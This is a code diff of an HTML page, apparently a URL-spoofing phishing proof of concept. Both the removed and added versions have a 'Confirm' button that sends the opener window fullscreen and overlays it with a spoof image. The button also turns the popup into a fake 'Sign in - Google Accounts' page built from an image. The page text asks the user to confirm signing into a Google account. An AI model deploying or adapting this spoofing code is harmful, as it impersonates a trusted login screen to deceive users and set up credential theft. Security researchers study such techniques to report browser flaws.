@@ -1,102 +1,36 @@
 <!DOCTYPE HTML>
-<html lang="en-US">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>URL Spoofing V2</title>
+<meta charset="UTF-8">
+<title>Confirm</title>
 
-    <style>
-        #button {
-            width: 150px;
-            height: 35px;
-        }
-    </style>
+<script>
+function spoof() {
 
-    <script>
-        function spoof() {
+    // Tell main window to enter fullscreen + spoof image
+    try {
+        window.opener.goFullscreenAndSpoof();
+    } catch(e) {
+        console.warn("opener not accessible", e);
+    }
 
-            const openerHTML = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <style>
-                        body {
-                            margin: 0;
-                            padding: 0;
-                        }
-                        #content {
-                            width: 100%;
-                            height: 100%;
-                            object-fit: cover;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <img id="content" src="spoof.png">
-                </body>
-                </html>
-            `;
+    // Replace popup content with sign page
+    document.open();
+    document.write(`
+        <img src="sign.png" style="width:100%;height:100%;object-fit:cover;">
+    `);
+    document.close();
+}
+</script>
 
-            const popupHTML = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Sign in - Google Accounts</title>
-                    <style>
-                        body {
-                            margin: 0;
-                            padding: 0;
-                        }
-                        #content {
-                            width: 100%;
-                            height: 100%;
-                            object-fit: cover;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <img id="content" src="sign.png">
-                </body>
-                </html>
-            `;
-
-            /* ----------------------------------------------------
-               1. FULLSCREEN (VALID because triggered by click)
-            ---------------------------------------------------- */
-            try {
-                window.opener.document.documentElement.requestFullscreen();
-            } catch (e) {
-                console.warn("Fullscreen blocked:", e);
-            }
-
-            /* ----------------------------------------------------
-               2. GANTI MAIN WINDOW → spoof.png
-            ---------------------------------------------------- */
-            try {
-                window.opener.document.open();
-                window.opener.document.write(openerHTML);
-                window.opener.document.close();
-            } catch (e) {
-                console.warn("Cannot modify opener:", e);
-            }
-
-            /* ----------------------------------------------------
-               3. GANTI POPUP INI → sign.png
-            ---------------------------------------------------- */
-            document.open();
-            document.write(popupHTML);
-            document.close();
-        }
-    </script>
 </head>
-
 <body>
-    <center>
-        <br>
-        <h1>
-            Please confirm you want to signin into your Google Account<br><br>
-            <button id="button" onclick="spoof();">Confirm</button>
-        </h1>
-    </center>
+<center>
+    <br>
+    <h1>
+        Please confirm you want to sign in<br><br>
+        <button onclick="spoof();">Confirm</button>
+    </h1>
+</center>
 </body>
 </html>
